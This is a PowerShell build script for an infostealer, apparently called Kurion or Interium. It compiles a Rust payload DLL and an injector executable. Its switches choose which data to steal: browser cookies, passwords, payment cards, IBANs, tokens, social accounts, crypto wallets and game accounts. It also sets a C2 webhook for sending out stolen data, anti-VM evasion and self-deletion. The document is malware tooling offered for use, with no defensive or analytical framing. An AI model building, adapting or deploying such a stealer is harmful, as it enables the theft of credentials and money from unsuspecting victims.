param(
    [string]$Webhook = "",
    [switch]$AntiVM,
    [switch]$SelfDelete,
    [switch]$Debug,
    [switch]$NoCookies,
    [switch]$NoPasswords,
    [switch]$NoCards,
    [switch]$NoIbans,
    [switch]$NoTokens,
    [switch]$NoBookmarks,
    [switch]$NoSocials,
    [switch]$NoWallets,
    [switch]$NoGames
)

$ErrorActionPreference = "Stop"
Set-Location $PSScriptRoot

$AllFeatures = @(
    @{ Name="cookies";   Flag="extract_cookies";   Disabled=$NoCookies },
    @{ Name="passwords"; Flag="extract_passwords"; Disabled=$NoPasswords },
    @{ Name="cards";     Flag="extract_cards";     Disabled=$NoCards },
    @{ Name="ibans";     Flag="extract_ibans";     Disabled=$NoIbans },
    @{ Name="tokens";    Flag="extract_tokens";    Disabled=$NoTokens },
    @{ Name="bookmarks"; Flag="extract_bookmarks"; Disabled=$NoBookmarks },
    @{ Name="socials";   Flag="extract_socials";   Disabled=$NoSocials },
    @{ Name="wallets";   Flag="extract_wallets";   Disabled=$NoWallets },
    @{ Name="games";     Flag="extract_games";     Disabled=$NoGames }
)

$EnabledNames = @()
$CargoFeatures = @()
foreach ($f in $AllFeatures) {
    if (-not $f.Disabled) {
        $EnabledNames += $f.Name
        $CargoFeatures += $f.Flag
    }
}

$env:KURION_FEATURES   = $EnabledNames -join ","
$env:KURION_C2_URL     = $Webhook
$env:KURION_ANTIVM     = if ($AntiVM)     { "true" } else { "false" }
$env:KURION_SELF_DELETE = if ($SelfDelete) { "true" } else { "false" }
$env:KURION_DEBUG      = if ($Debug)      { "true" } else { "false" }

Write-Host ""
Write-Host "=== Interium Build ===" -ForegroundColor Cyan
Write-Host "Features : $($EnabledNames -join ', ')"
Write-Host "Webhook  : $(if ($Webhook) { $Webhook.Substring(0, [Math]::Min(40, $Webhook.Length)) + '...' } else { '(none)' })"
Write-Host "AntiVM   : $($AntiVM.IsPresent)  |  SelfDelete: $($SelfDelete.IsPresent)  |  Debug: $($Debug.IsPresent)"
Write-Host ""

$FeatureArg = if ($CargoFeatures.Count -gt 0) { "--features `"$($CargoFeatures -join ',')`"" } else { "" }

$InjectorFeatures = ""
if ($Debug) { $InjectorFeatures = "--features debug_console" }

Write-Host "[1/2] Building payload..." -ForegroundColor Yellow
Set-Location payload
$cmd = "cargo build --release --target x86_64-pc-windows-msvc --no-default-features $FeatureArg"
Invoke-Expression $cmd
if ($LASTEXITCODE -ne 0) { throw "Payload build failed" }
Set-Location ..

Write-Host "[2/2] Building injector..." -ForegroundColor Yellow
Set-Location injector
$cmd = "cargo build --release --target x86_64-pc-windows-msvc $InjectorFeatures"
Invoke-Expression $cmd
if ($LASTEXITCODE -ne 0) { throw "Injector build failed" }
Set-Location ..

$OutDir = "target\x86_64-pc-windows-msvc\release"
Write-Host ""
Write-Host "=== Build Complete ===" -ForegroundColor Green
Write-Host "  Injector: $OutDir\injector.exe"
Write-Host "  Payload:  $OutDir\payload.dll"
Write-Host ""
